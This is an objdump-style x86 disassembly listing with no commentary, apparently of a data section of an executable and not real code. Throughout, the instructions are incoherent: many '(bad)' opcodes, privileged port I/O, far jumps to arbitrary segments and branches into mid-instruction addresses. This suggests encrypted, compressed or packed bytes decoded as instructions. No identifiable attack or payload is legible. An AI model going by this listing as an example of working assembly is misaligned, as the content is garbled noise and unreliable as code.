  40eea0:	push   es
  40eea1:	sbb    ah,BYTE PTR ds:0x41e01ab0
  40eea7:	or     edx,DWORD PTR [ebp+eax*1+0x6f]
  40eeab:	mov    edi,0xc8be36d5
  40eeb0:	xlat   BYTE PTR ds:[ebx]
  40eeb1:	adc    eax,0x42677326
  40eeb6:	dec    ecx
  40eeb7:	das    
  40eeb8:	call   0xb14:0xeb5f7df3
  40eebf:	stos   BYTE PTR es:[edi],al
  40eec0:	outs   dx,BYTE PTR ds:[esi]
  40eec1:	in     eax,0xfa
  40eec3:	sahf   
  40eec4:	es iret 
  40eec6:	pop    es
  40eec7:	push   esi
  40eec8:	in     al,0x10
  40eeca:	mov    ch,0x12
  40eecc:	ins    BYTE PTR es:[edi],dx
  40eecd:	xor    ebp,DWORD PTR [edx-0x49]
  40eed0:	sar    DWORD PTR [eax-0x3],1
  40eed3:	pop    esp
  40eed4:	fstp   st(6)
  40eed6:	sub    al,0x32
  40eed8:	(bad)  
  40eed9:	cmp    eax,0x58ed238a
  40eede:	rcl    BYTE PTR [eax-0x36df2980],cl
  40eee4:	inc    esi
  40eee5:	xchg   esi,eax
  40eee6:	adc    DWORD PTR [ecx],esi
  40eee8:	cmp    edx,ebp
  40eeea:	mov    bl,0x2f
  40eeec:	fcomp  DWORD PTR [ebx+edx*8-0x16]
  40eef0:	sub    esp,edx
  40eef2:	out    0x99,eax
  40eef4:	jne    0x40eef9
  40eef6:	pop    es
  40eef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eef8:	jae    0x40ef78
  40eefa:	js     0x40ef22
  40eefc:	mov    ds,WORD PTR [edx-0x33]
  40eeff:	inc    eax
  40ef00:	fst    DWORD PTR [esi-0x54]
  40ef03:	sbb    bl,BYTE PTR [ecx+0x4fb050b9]
  40ef09:	add    ebp,DWORD PTR [ecx+0x75]
  40ef0c:	and    esi,ebp
  40ef0e:	xchg   ecx,eax
  40ef0f:	out    dx,al
  40ef10:	sbb    dl,BYTE PTR [edi+0x20644cd6]
  40ef16:	dec    ebx
  40ef17:	pop    edx
  40ef18:	xor    al,0x24
  40ef1a:	mov    ah,0x9c
  40ef1c:	mov    al,0x59
  40ef1e:	jge    0x40eebb
  40ef20:	repnz rcr BYTE PTR [edi],cl
  40ef23:	pop    es
  40ef24:	imul   edi,eax,0x49d1da35
  40ef2a:	mov    esp,0xc3b1dc8f
  40ef2f:	mov    edx,0x3a69feb6
  40ef34:	jge    0x40eed3
  40ef36:	adc    ah,BYTE PTR [edx+0xe]
  40ef39:	pop    edi
  40ef3a:	popa   
  40ef3b:	arpl   WORD PTR [eax+0xe546e55],cx
  40ef41:	icebp  
  40ef42:	pop    es
  40ef43:	ffreep st(0)
  40ef45:	mov    cl,0x98
  40ef47:	add    al,0x5d
  40ef49:	rol    BYTE PTR [eax],1
  40ef4b:	test   DWORD PTR [eax],0x454a1a90
  40ef51:	xchg   ebp,eax
  40ef52:	jmp    0x9cac1c31
  40ef57:	aaa    
  40ef58:	fst    QWORD PTR [edi]
  40ef5a:	ds in  al,dx
  40ef5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef5d:	and    al,0x26
  40ef5f:	mov    dl,BYTE PTR [ebx]
  40ef61:	xor    BYTE PTR [ebx-0x35be1c3b],ch
  40ef67:	sti    
  40ef68:	or     al,0x5a
  40ef6a:	dec    esp
  40ef6b:	lea    esp,[ecx-0x9]
  40ef6e:	and    BYTE PTR [ecx-0x13],0x1b
  40ef72:	std    
  40ef73:	sahf   
  40ef74:	sbb    eax,0x51fe1ef6
  40ef79:	fs sub al,0xc4
  40ef7c:	data16 out 0x9d,al
  40ef7f:	or     ch,0xc1
  40ef82:	es (bad) 
  40ef84:	ins    BYTE PTR es:[edi],dx
  40ef85:	mov    esi,0xd9bb2749
  40ef8a:	push   ebx
  40ef8b:	(bad)  
  40ef8c:	push   ds
  40ef8d:	imul   ebp,DWORD PTR [ebp-0x68],0x65e807bf
  40ef94:	dec    ebp
  40ef95:	xlat   BYTE PTR ds:[ebx]
  40ef96:	(bad)  
  40ef97:	stc    
  40ef98:	(bad)  
  40ef99:	jp     0x40efc7
  40ef9b:	xchg   dh,dh
  40ef9d:	call   0x4655:0x2ce6840e
  40efa4:	inc    esp
  40efa5:	or     DWORD PTR gs:[edi-0x14],0x57
  40efaa:	pop    esp
  40efab:	icebp  
  40efac:	mov    bl,0x96
  40efae:	jmp    0x7982:0x59b6d353
  40efb5:	cmp    esp,esi
  40efb7:	les    esi,FWORD PTR fs:[ebp+0x695449e9]
  40efbe:	imul   edi,DWORD PTR [ecx+ecx*4+0x74d48c44],0xffffffda
  40efc6:	shl    DWORD PTR [eax-0x1bfbdd76],cl
  40efcc:	mov    ebp,0x27026e63
  40efd1:	push   0xf3da413
  40efd6:	outs   dx,DWORD PTR ds:[esi]
  40efd7:	adc    dh,BYTE PTR [edx-0x5f]
  40efda:	scas   eax,DWORD PTR es:[edi]
  40efdb:	adc    al,0xea
  40efdd:	add    DWORD PTR [edx-0x73],ecx
  40efe0:	xor    dl,dh
  40efe2:	xor    eax,0x918adf14
  40efe7:	xor    BYTE PTR gs:[edi+eiz*8+0x62],ah
  40efec:	and    DWORD PTR [edi],eax
  40efee:	mov    edi,0x7b248272
  40eff3:	jp     0x40f013
  40eff5:	jge    0x40efb9
  40eff7:	fild   DWORD PTR [ebp-0x314ddc3b]
  40effd:	cmp    cl,BYTE PTR [edi-0x43]
  40f000:	mov    DWORD PTR [edi-0x2f4699ed],esi
  40f006:	mov    ah,0x16
  40f008:	and    al,0xfb
  40f00a:	cmp    al,0x71
  40f00c:	cdq    
  40f00d:	outs   dx,DWORD PTR ds:[esi]
  40f00e:	pop    ebx
  40f00f:	in     eax,0xa9
  40f011:	lock fisubr WORD PTR [edi]
  40f014:	(bad)  
  40f015:	or     eax,0x19ec3f8f
  40f01a:	or     ebx,DWORD PTR [ebp-0x5c]
  40f01d:	push   ebp
  40f01e:	mov    eax,ds:0xda961e5
  40f023:	jnp    0x40f09c
  40f025:	imul   edi,esp,0xe420db59
  40f02b:	xchg   ebx,eax
  40f02c:	out    0xc6,eax
  40f02e:	jae    0x40f0a3
  40f030:	or     al,0x36
  40f032:	or     ebx,DWORD PTR [edx-0x61]
  40f035:	xor    DWORD PTR ds:0x5bdb43a5,edx
  40f03b:	scas   eax,DWORD PTR es:[edi]
  40f03c:	sbb    eax,0x3dbf2413
  40f041:	jno    0x40f067
  40f043:	dec    edi
  40f044:	inc    esi
  40f045:	shl    edi,cl
  40f047:	or     eax,0xd2b2edb7
  40f04c:	stc    
  40f04d:	addr16 sbb eax,0x3312e45e
  40f053:	sub    bh,dh
  40f055:	or     bh,BYTE PTR [edi]
  40f057:	push   es
  40f058:	fidiv  DWORD PTR [edi]
  40f05a:	adc    eax,0xe8ba72ed
  40f05f:	mov    BYTE PTR [ebp-0x4c2005ca],ch
  40f065:	test   al,0xdb
  40f067:	add    esi,ebp
  40f069:	loope  0x40f005
  40f06b:	dec    edi
  40f06c:	(bad)  fs:[eax-0x4b2e9247]
  40f073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f074:	imul   edi,ecx,0x57
  40f077:	jnp    0x40f094
  40f079:	gs dec ebp
  40f07b:	mov    edx,0xca777dc5
  40f080:	mov    edx,DWORD PTR [ecx]
  40f082:	xchg   edi,eax
  40f083:	loop   0x40f102
  40f085:	push   0x1f0b3570
  40f08a:	pop    ebp
  40f08b:	arpl   WORD PTR [edi-0x7c],bp
  40f08e:	jmp    FWORD PTR [edx]
  40f090:	mov    esi,0x40c108c0
  40f095:	rcl    BYTE PTR [edx+0x69],0x8c
  40f099:	push   ds
  40f09a:	sti    
  40f09b:	mov    esp,0x447addcf
  40f0a0:	ja     0x40f085
  40f0a2:	xchg   bp,ax
  40f0a4:	fwait
  40f0a5:	pop    esp
  40f0a6:	repnz xchg esp,eax
  40f0a8:	sti    
  40f0a9:	sub    DWORD PTR [ebx-0xb007f23],ebp
  40f0af:	sbb    DWORD PTR [esi],ebp
  40f0b1:	mov    cs,esp
  40f0b3:	repnz fidiv DWORD PTR [esi]
  40f0b6:	cmp    eax,ecx
  40f0b8:	push   ecx
  40f0b9:	test   DWORD PTR [edx+0x429e0ec],edx
  40f0bf:	dec    eax
  40f0c0:	pop    ss
  40f0c1:	shl    BYTE PTR [ebp-0x33],1
  40f0c4:	fimul  DWORD PTR [ebx+0x5bc3cd47]
  40f0ca:	popf   
  40f0cb:	nop
  40f0cc:	ret    
  40f0cd:	test   DWORD PTR [eax-0x61],0xe9e1d4f9
  40f0d4:	dec    esp
  40f0d5:	(bad)  
  40f0d6:	pop    ss
  40f0d7:	fld    TBYTE PTR [edi+0x76]
  40f0da:	ins    DWORD PTR es:[edi],dx
  40f0db:	inc    DWORD PTR [ecx]
  40f0dd:	xchg   edx,eax
  40f0de:	xchg   esp,eax
  40f0df:	xchg   BYTE PTR [edi-0x25214c1f],ah
  40f0e5:	add    BYTE PTR [ebx+0x1b],bh
  40f0e8:	sub    DWORD PTR [ecx+eiz*8],ebx
  40f0eb:	icebp  
  40f0ec:	mov    ds:0x5d35eedc,eax
  40f0f1:	jae    0x40f0f6
  40f0f3:	dec    edx
  40f0f4:	pop    ss
  40f0f5:	adc    ebx,DWORD PTR [ebp+0x1]
  40f0f8:	pushf  
  40f0f9:	push   es
  40f0fa:	cmp    al,0x20
  40f0fc:	xchg   esi,eax
  40f0fd:	mov    ss:0x3d9474cb,eax
  40f103:	movq   mm7,QWORD PTR [edi]
  40f106:	dec    esp
  40f107:	scas   eax,DWORD PTR es:[edi]
  40f108:	xchg   esp,eax
  40f109:	popf   
  40f10a:	into   
  40f10b:	int    0xaa
  40f10d:	in     eax,dx
  40f10e:	fisubr DWORD PTR [edx+0x4189eb42]
  40f114:	shr    DWORD PTR [edi-0x76],1
  40f117:	pop    ds
  40f118:	nop
  40f119:	daa    
  40f11a:	pop    es
  40f11b:	mov    esp,0xfe6291e1
  40f120:	daa    
  40f121:	and    DWORD PTR [ecx-0x6a],eax
  40f124:	cmp    BYTE PTR [ecx-0x5f],bh
  40f127:	xor    eax,0x96d11b36
  40f12c:	scas   al,BYTE PTR es:[edi]
  40f12d:	out    0xe7,eax
  40f12f:	call   0x5e598d19
  40f134:	add    BYTE PTR [edi],0x4
  40f137:	fs pop ebx
  40f139:	je     0x40f14b
  40f13b:	sar    BYTE PTR [edi-0x30366bb6],1
  40f141:	ds inc edi
  40f143:	pop    es
  40f144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f145:	cs jne 0x40f0d4
  40f148:	ret    0x2dd1
  40f14b:	sbb    DWORD PTR [ebp+0x6e],ebp
  40f14e:	or     eax,0x6cd56c63
  40f153:	xchg   ch,al
  40f155:	add    BYTE PTR [ecx+0x1bbfb7de],dh
  40f15b:	icebp  
  40f15c:	sbb    al,0x83
  40f15e:	xchg   ebp,eax
  40f15f:	loop   0x40f1ab
  40f161:	cmp    edi,0xdbc12137
  40f167:	(bad)  
  40f168:	shr    BYTE PTR [ecx-0x49],0x67
  40f16c:	sbb    BYTE PTR [ecx-0x9],ch
  40f16f:	mov    ecx,0xd4aaf7ab
  40f174:	xor    DWORD PTR [ecx-0x42658b6f],0xb99109ea
  40f17e:	popw   ss
  40f180:	popf   
  40f181:	je     0x40f104
  40f183:	mov    cl,0xf2
  40f185:	ficomp DWORD PTR [edi+0x50]
  40f188:	cmp    bh,cl
  40f18a:	mov    ds:0xa45a8796,al
  40f18f:	push   0x5b
  40f191:	ficomp WORD PTR [edi]
  40f193:	jo     0x40f1ff
  40f195:	adc    edx,DWORD PTR [ecx]
  40f197:	fld    TBYTE PTR [eax+0x58]
  40f19a:	mov    esi,DWORD PTR [esi-0x39aa060f]
  40f1a0:	icebp  
  40f1a1:	xor    al,0x5b
  40f1a3:	popf   
  40f1a4:	test   esp,0xe4c44395
  40f1aa:	xor    eax,DWORD PTR [edi-0x19fcc538]
  40f1b0:	dec    ecx
  40f1b1:	jb     0x40f15d
  40f1b3:	and    al,0x12
  40f1b5:	aam    0x20
  40f1b7:	retf   0x1be8
  40f1ba:	addr16 mov ebx,0x12cb23c
  40f1c0:	icebp  
  40f1c1:	add    DWORD PTR [ebx-0x11],0xcb8c4755
  40f1c8:	leave  
  40f1c9:	inc    edi
  40f1ca:	cmp    al,0xf1
  40f1cc:	mov    bl,0x5e
  40f1ce:	pop    eax
  40f1cf:	inc    ebx
  40f1d0:	push   dx
  40f1d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1d3:	imul   eax,DWORD PTR [edi+0x78d21350],0x60
  40f1da:	xchg   edi,eax
  40f1db:	daa    
  40f1dc:	mov    edi,0xf7540890
  40f1e1:	inc    edx
  40f1e2:	fisttp WORD PTR [eax+esi*8+0x1f67da98]
  40f1e9:	mov    BYTE PTR [edx],dl
  40f1eb:	ja     0x40f1a7
  40f1ed:	mov    edi,0x79a8ec07
  40f1f2:	cmp    BYTE PTR [ecx-0x25ebbc8c],bl
  40f1f8:	mov    edi,0xf0f67903
  40f1fd:	add    al,0xf4
  40f1ff:	add    eax,0xffffffb1
  40f202:	popa   
  40f203:	inc    si
  40f205:	mov    bh,0xaa
  40f207:	sub    DWORD PTR [edi-0x3],edx
  40f20a:	inc    ebx
  40f20b:	add    al,0x11
  40f20d:	or     eax,DWORD PTR [ebp-0x5e]
  40f210:	xchg   ebx,eax
  40f211:	das    
  40f212:	popa   
  40f213:	jns    0x40f1c7
  40f215:	pop    eax
  40f216:	fwait
  40f217:	fwait
  40f218:	mov    bl,BYTE PTR [edi]
  40f21a:	out    dx,eax
  40f21b:	pop    ds
  40f21c:	pop    ebx
  40f21d:	test   al,0x5e
  40f21f:	test   esp,ebp
  40f221:	mov    cl,0xdb
  40f223:	inc    eax
  40f224:	xor    eax,0xefb20890
  40f229:	push   esi
  40f22a:	neg    DWORD PTR [edi+0x5867e847]
  40f230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f231:	addr16 js 0x40f216
  40f234:	mov    ebp,0x11244263
  40f239:	xchg   ah,cl
  40f23b:	call   0x7ee8b5d6
  40f240:	xlat   BYTE PTR ds:[ebx]
  40f241:	sub    DWORD PTR [edx-0x70b03133],esi
  40f247:	dec    eax
  40f248:	inc    ebx
  40f249:	push   fs
  40f24b:	out    0x24,eax
  40f24d:	iret   
  40f24e:	sub    BYTE PTR [ebx+0x1],al
  40f251:	sub    cl,BYTE PTR [eax]
  40f253:	jmp    0x92939d75
  40f258:	xchg   esi,eax
  40f259:	pop    ds
  40f25a:	push   edx
  40f25b:	mov    ebp,0xa05d952b
  40f260:	cwde   
  40f261:	mov    cl,0x8c
  40f263:	xchg   ecx,eax
  40f264:	repz mov edi,0xef136c7f
  40f26a:	mov    bl,0x62
  40f26c:	call   0xc90d:0x4e31c3d4
  40f273:	ror    edx,0xe3
  40f276:	ins    DWORD PTR es:[edi],dx
  40f277:	xor    ecx,DWORD PTR [edx*2-0x569119d]
  40f27e:	pop    esp
  40f27f:	out    0xe2,al
  40f281:	ins    BYTE PTR es:[edi],dx
  40f282:	jp     0x40f269
  40f284:	add    BYTE PTR [edi+0x36],dl
  40f287:	or     bh,BYTE PTR [esi]
  40f289:	fnsave [ebx-0x41]
  40f28c:	leave  
  40f28d:	or     eax,0xa54d1fd2
  40f292:	std    
  40f293:	rol    BYTE PTR [edx+0x46a3944],cl
  40f299:	mov    ds:0x1afc6bd4,eax
  40f29e:	pop    esi
  40f29f:	ror    BYTE PTR [edi-0x2a9d2b99],0xd8
  40f2a6:	aaa    
  40f2a7:	fiadd  DWORD PTR [ebp-0x5b]
  40f2aa:	mov    dh,0xcc
  40f2ac:	mov    bh,0x1b
  40f2ae:	ret    0x4f9e
  40f2b1:	dec    edi
  40f2b2:	dec    eax
  40f2b3:	leave  
  40f2b4:	out    0xc3,al
  40f2b6:	bound  esp,QWORD PTR [ecx+0x1623f709]
  40f2bc:	sti    
  40f2bd:	repnz adc bh,BYTE PTR [ecx-0x21]
  40f2c1:	xor    DWORD PTR [eax],ebx
  40f2c3:	push   esi
  40f2c4:	push   esi
  40f2c5:	nop
  40f2c6:	rcr    esp,1
  40f2c8:	push   cs
  40f2c9:	add    ch,BYTE PTR [edi]
  40f2cb:	(bad)  
  40f2cc:	addr16 std 
  40f2ce:	or     esp,edi
  40f2d0:	fdiv   DWORD PTR [ecx+eax*2+0x14]
  40f2d4:	xchg   ebp,eax
  40f2d5:	sbb    ah,ah
  40f2d7:	sub    ch,BYTE PTR [edx+0x5b]
  40f2da:	dec    eax
  40f2db:	or     DWORD PTR [esi],0x316d9b0b
  40f2e1:	dec    ebx
  40f2e2:	jmp    0x40f2c2
  40f2e4:	inc    ebx
  40f2e5:	sbb    ebp,DWORD PTR gs:[ebp-0x21]
  40f2e9:	aad    0x57
  40f2eb:	or     DWORD PTR [esi+eiz*2-0x5102f845],esp
  40f2f2:	jns    0x40f29d
  40f2f4:	jb     0x40f2a9
  40f2f6:	and    cl,BYTE PTR [ebx+0x9f0630e]
  40f2fc:	test   al,0xbe
  40f2fe:	pop    esp
  40f2ff:	popf   
  40f300:	xor    al,BYTE PTR [edi]
  40f302:	cmpps  xmm0,XMMWORD PTR [ecx+0x17cc745c],0xb5
  40f30a:	and    eax,0x25b180e4
  40f30f:	pop    DWORD PTR [ebx-0x4a]
  40f312:	xchg   DWORD PTR [eax],esp
  40f314:	mul    BYTE PTR [esi-0x746053c]
  40f31a:	fidiv  WORD PTR [ecx]
  40f31c:	cmp    DWORD PTR [ecx-0x27bd415e],ebp
  40f322:	lock ins DWORD PTR es:[edi],dx
  40f324:	shl    dh,cl
  40f326:	dec    edi
  40f327:	adc    dl,BYTE PTR [ebp+0x24]
  40f32a:	dec    edi
  40f32b:	add    eax,0x4ec4139e
  40f330:	js     0x40f3a9
  40f332:	mul    DWORD PTR [ebx+ebx*2-0x51]
  40f336:	mov    eax,0xf35864f2
  40f33b:	inc    ebx
  40f33c:	(bad)  
  40f33d:	mov    ecx,0xf985be73
  40f342:	sbb    edx,ecx
  40f344:	push   edx
  40f345:	or     eax,0x5231aedd
  40f34a:	repz fmul DWORD PTR [ebx+0x52408377]
  40f351:	add    BYTE PTR [ebp-0x2d2dbc0e],ch
  40f357:	cli    
  40f358:	mov    eax,ds:0xeb001acb
  40f35d:	jmp    0x3619:0x32384edf
  40f364:	fwait
  40f365:	imul   ecx,DWORD PTR [ebp-0x77b99fc1],0x12
  40f36c:	mov    ebx,DWORD PTR [ecx+0x45]
  40f36f:	sub    edx,ecx
  40f371:	mov    esp,0x508403d
  40f376:	aaa    
  40f377:	jne    0x40f324
  40f379:	jge    0x40f3f2
  40f37b:	push   cs
  40f37c:	or     al,0xf3
  40f37e:	fwait
  40f37f:	xchg   ebx,eax
  40f380:	mov    bl,0xdb
  40f382:	jne    0x40f399
  40f384:	cs jle 0x40f3b0
  40f387:	jmp    0x3206ae82
  40f38c:	pushf  
  40f38d:	push   ebp
  40f38e:	test   al,0x48
  40f390:	pop    es
  40f391:	out    0x92,eax
  40f393:	lock jno 0x40f39a
  40f396:	int3   
  40f397:	loope  0x40f3d1
  40f399:	xor    BYTE PTR [ebx+eiz*8+0x1fb235e9],bl
  40f3a0:	iret   
  40f3a1:	sub    BYTE PTR [eax-0x37],bh
  40f3a4:	(bad)  
  40f3a5:	cdq    
  40f3a6:	sti    
  40f3a7:	outs   dx,BYTE PTR ds:[esi]
  40f3a8:	fsub   DWORD PTR [edx]
  40f3aa:	mov    cl,0x4b
  40f3ac:	add    DWORD PTR ds:0xad05f752,ebp
  40f3b2:	sub    DWORD PTR [edi],ecx
  40f3b4:	cli    
  40f3b5:	dec    ebp
  40f3b6:	cmp    ch,0xcf
  40f3b9:	imul   esp,DWORD PTR [eax],0xc
  40f3bc:	aaa    
  40f3bd:	out    0xf8,eax
  40f3bf:	sbb    al,0x71
  40f3c1:	loope  0x40f3da
  40f3c3:	pop    esp
  40f3c4:	cmp    BYTE PTR [edi-0x582004b3],ch
  40f3ca:	nop
  40f3cb:	xchg   esi,eax
  40f3cc:	jge    0x40f3d9
  40f3ce:	jbe    0x40f3be
  40f3d0:	pop    eax
  40f3d1:	imul   esp,DWORD PTR [edx-0x70e80397],0x1e
  40f3d8:	adc    DWORD PTR [ebx-0x10],0x9
  40f3dc:	test   ah,0xec
  40f3df:	dec    esi
  40f3e0:	mov    eax,ds:0xff6c86e4
  40f3e5:	imul   ebp,DWORD PTR [ecx],0xbb53d1e5
  40f3eb:	pop    esp
  40f3ec:	pop    ss
  40f3ed:	pop    ebp
  40f3ee:	sub    al,BYTE PTR [ebx-0x5f6f20e5]
  40f3f4:	lahf   
  40f3f5:	adc    ch,bh
  40f3f7:	imul   ecx,edi,0x883e8d3a
  40f3fd:	mov    ah,0x71
  40f3ff:	fcmovne st,st(7)
  40f401:	int    0x99
  40f403:	loopne 0x40f3a6
  40f405:	pop    edx
  40f406:	ss in  al,dx
  40f408:	mov    bl,0xb7
  40f40a:	fidivr DWORD PTR [edx+0xf58725c]
  40f410:	sub    DWORD PTR [eax+0x50],ecx
  40f413:	jno    0x40f3c3
  40f415:	or     eax,0x64d77da0
  40f41a:	test   eax,0x6489f6cc
  40f41f:	push   ebp
  40f420:	mov    dh,0xa
  40f422:	mov    ch,0xb4
  40f424:	mov    WORD PTR [edi+0x2],?
  40f427:	add    eax,0x2e3ff498
  40f42c:	out    0x55,eax
  40f42e:	shl    DWORD PTR [eax],0x78
  40f431:	push   cs
  40f432:	or     DWORD PTR [esi],ebp
  40f434:	sub    eax,eax
  40f436:	pop    es
  40f437:	scas   al,BYTE PTR es:[edi]
  40f438:	cld    
  40f439:	lods   al,BYTE PTR ds:[esi]
  40f43a:	retf   0xe544
  40f43d:	mov    bh,0xd2
  40f43f:	fprem1 
  40f441:	and    al,ch
  40f443:	inc    ebp
  40f444:	jno    0x40f46d
  40f446:	lods   eax,DWORD PTR ds:[esi]
  40f447:	lods   al,BYTE PTR ds:[esi]
  40f448:	or     al,0x9
  40f44a:	hlt    
  40f44b:	imul   eax,edi,0xe2f43bc6
  40f451:	inc    edi
  40f452:	int3   
  40f453:	inc    esp
  40f454:	mov    esp,0xe9a42981
  40f459:	lahf   
  40f45a:	bound  edx,QWORD PTR [eax]
  40f45c:	jmp    0x49a07f25
  40f461:	data16 and BYTE PTR [esi+0x3ac2d6e],ch
  40f468:	pushf  
  40f469:	les    ebx,FWORD PTR [edx-0x4527f264]
  40f46f:	add    al,0x2d
  40f471:	or     BYTE PTR [ecx-0x3],bl
  40f474:	out    0x2d,eax
  40f476:	jg     0x40f3fc
  40f478:	push   cs
  40f479:	or     DWORD PTR [ebx-0x776cc660],esp
  40f47f:	sti    
  40f480:	jmp    0x2d75:0x760000b3
  40f487:	aas    
  40f488:	das    
  40f489:	mov    bl,0xc
  40f48b:	jp     0x40f4be
  40f48d:	jae    0x40f4a3
  40f48f:	cli    
  40f490:	pop    edx
  40f491:	mov    dl,0x15
  40f493:	jbe    0x40f42a
  40f495:	in     eax,0x40
  40f497:	(bad)  
  40f498:	int    0x9b
  40f49a:	pop    esp
  40f49b:	sub    DWORD PTR [edx+ecx*8-0x42],ebp
  40f49f:	dec    ebx
  40f4a0:	jp     0x40f464
  40f4a2:	dec    ebx
  40f4a3:	mov    gs,WORD PTR [eax]
  40f4a5:	push   ebx
  40f4a6:	dec    ebp
  40f4a7:	xchg   ebx,eax
  40f4a8:	xor    eax,0x2f80fff1
  40f4ad:	iret   
  40f4ae:	fisub  WORD PTR ds:0xc3713079
  40f4b4:	fcmovu st,st(2)
  40f4b6:	adc    al,0x62
  40f4b8:	out    dx,eax
  40f4b9:	mov    al,0xbc
  40f4bb:	inc    BYTE PTR [ecx+0x30]
  40f4be:	mov    DWORD PTR [edx-0x64966411],esp
  40f4c4:	or     ebx,ebp
  40f4c6:	jle    0x40f4d0
  40f4c8:	mov    al,ds:0xec88647b
  40f4cd:	shl    DWORD PTR [edx-0x23],1
  40f4d0:	mov    eax,0x171f0421
  40f4d5:	adc    BYTE PTR [edx-0x33],ch
  40f4d8:	sub    ecx,DWORD PTR [ecx-0x55]
  40f4db:	add    DWORD PTR [esi-0x225c93e3],eax
  40f4e1:	sub    eax,0x2448ee76
  40f4e6:	addr16 xchg edx,eax
  40f4e8:	mov    al,ds:0x314f33b6
  40f4ed:	sbb    BYTE PTR [ebp-0x4d86abac],bh
  40f4f3:	stos   DWORD PTR es:[edi],eax
  40f4f4:	push   eax
  40f4f5:	test   al,0x65
  40f4f7:	dec    esi
  40f4f8:	shl    BYTE PTR [esi],1
  40f4fa:	add    esp,DWORD PTR [edx+0x41c9e875]
  40f500:	adc    bh,0x43
  40f503:	push   ecx
  40f504:	cmp    edx,eax
  40f506:	call   0x33b7:0xaf01ae9b
  40f50d:	sbb    esi,DWORD PTR [ebp-0x2cf9271c]
  40f513:	es xchg ecx,eax
  40f515:	xchg   esi,eax
  40f516:	movhps QWORD PTR [edx-0x3],xmm1
  40f51a:	xchg   edi,eax
  40f51b:	fld    DWORD PTR [ecx]
  40f51d:	pushf  
  40f51e:	adc    edi,ebx
  40f520:	push   ebx
  40f521:	mov    ebx,DWORD PTR [edx+0x70]
  40f524:	sub    dl,BYTE PTR [edx-0x74]
  40f527:	ret    
  40f528:	cld    
  40f529:	dec    eax
  40f52a:	jge    0x40f53b
  40f52c:	clc    
  40f52d:	hlt    
  40f52e:	retf   
  40f52f:	hlt    
  40f530:	fbld   TBYTE PTR [ebx+0x2b8dc466]
  40f536:	nop
  40f537:	out    0x95,eax
  40f539:	push   edx
  40f53a:	pop    ebp
  40f53b:	cli    
  40f53c:	xchg   ebp,eax
  40f53d:	mov    eax,0xc386b192
  40f542:	sbb    al,0x4d
  40f544:	iret   
  40f545:	xor    ecx,esp
  40f547:	(bad)  
  40f548:	mul    edi
  40f54a:	xor    esp,edx
  40f54c:	icebp  
  40f54d:	mov    WORD PTR [ebx],ss
  40f54f:	xchg   esp,eax
  40f550:	inc    ebp
  40f551:	add    al,0x41
  40f553:	inc    edi
  40f554:	call   0x6c9e765
  40f559:	jecxz  0x40f582
  40f55b:	mov    esi,0x7485f19f
  40f560:	data16 js 0x40f535
  40f563:	out    dx,eax
  40f564:	adc    DWORD PTR [edi-0x4ff96fd2],edi
  40f56a:	mov    BYTE PTR [ebx],bh
  40f56c:	retf   0xdbc3
  40f56f:	js     0x40f52b
  40f571:	test   DWORD PTR ds:0x4b884dc7,ecx
  40f577:	fldenv [edi-0x55]
  40f57a:	xchg   edx,eax
  40f57b:	stos   BYTE PTR es:[edi],al
  40f57c:	inc    esp
  40f57d:	stos   DWORD PTR es:[edi],eax
  40f57e:	push   eax
  40f57f:	xchg   BYTE PTR [esi+0x5b],ch
  40f582:	sbb    dl,dh
  40f584:	(bad)  
  40f585:	cld    
  40f586:	out    dx,al
  40f587:	add    ebx,DWORD PTR [edi+0x458b3364]
  40f58d:	bound  ebx,QWORD PTR [ebx+0x24c886c]
  40f593:	or     al,0xad
  40f595:	out    dx,eax
  40f596:	push   edx
  40f597:	cmp    eax,0xa1ee4544
  40f59c:	lahf   
  40f59d:	mov    dl,0x1
  40f59f:	xchg   DWORD PTR [eax-0x5e9ebbb1],esp
  40f5a5:	sbb    BYTE PTR [ebx+0x4d],ah
  40f5a8:	sub    DWORD PTR [ebx-0x39b56b70],edi
  40f5ae:	aas    
  40f5af:	mov    gs,WORD PTR [ebp+0x6fb763d1]
  40f5b5:	popf   
  40f5b6:	mov    ebp,0x502d6e7b
  40f5bb:	cdq    
  40f5bc:	push   es
  40f5bd:	dec    esp
  40f5be:	push   ss
  40f5bf:	fcom   QWORD PTR [ecx+0x1682ec37]
  40f5c5:	sbb    eax,0xf8f56a1f
  40f5ca:	or     bl,BYTE PTR ds:0x6533d4b0
  40f5d0:	jnp    0x40f5f8
  40f5d2:	cmp    bl,BYTE PTR [ecx-0x48]
  40f5d5:	pop    ds
  40f5d6:	mov    al,ds:0xffe5c592
  40f5db:	mov    bh,0x57
  40f5dd:	dec    edx
  40f5de:	inc    ebx
  40f5df:	jo     0x40f5df
  40f5e1:	out    0xef,eax
  40f5e3:	push   0xfffffff1
  40f5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e6:	add    bl,ch
  40f5e8:	add    al,0xa
  40f5ea:	inc    edi
  40f5eb:	loope  0x40f639
  40f5ed:	sbb    BYTE PTR [eax],bh
  40f5ef:	mov    ch,BYTE PTR [eax-0x17]
  40f5f2:	jp     0x40f5ba
  40f5f4:	ja     0x40f60e
  40f5f6:	rcl    DWORD PTR [esi+esi*2+0xcf3ff07],cl
  40f5fd:	adc    DWORD PTR [edi+0x33],ebx
  40f600:	ret    0xab9e
  40f603:	(bad)  
  40f605:	fdivp  st(1),st
  40f607:	jmp    0x31e352ac
  40f60c:	(bad)  
  40f60e:	cli    
  40f60f:	jmp    0x40f61d
  40f611:	inc    eax
  40f612:	xchg   edx,eax
  40f613:	mov    esp,0x9ace6f52
  40f618:	sahf   
  40f619:	jle    0x40f5f2
  40f61b:	daa    
  40f61c:	leave  
  40f61d:	aaa    
  40f61e:	into   
  40f61f:	test   cl,bl
  40f621:	mov    ecx,0xd249fcae
  40f626:	scas   eax,DWORD PTR es:[edi]
  40f627:	add    DWORD PTR [ebx+ebx*8],ecx
  40f62a:	nop
  40f62b:	and    ebx,DWORD PTR [esi-0x12]
  40f62e:	mov    esi,0x4f5fe25
  40f633:	sbb    DWORD PTR [esi],0xffffffb1
  40f636:	push   edx
  40f637:	sub    DWORD PTR [esi],edi
  40f639:	retf   0xdeaf
  40f63c:	in     al,dx
  40f63d:	push   es
  40f63e:	jo     0x40f68b
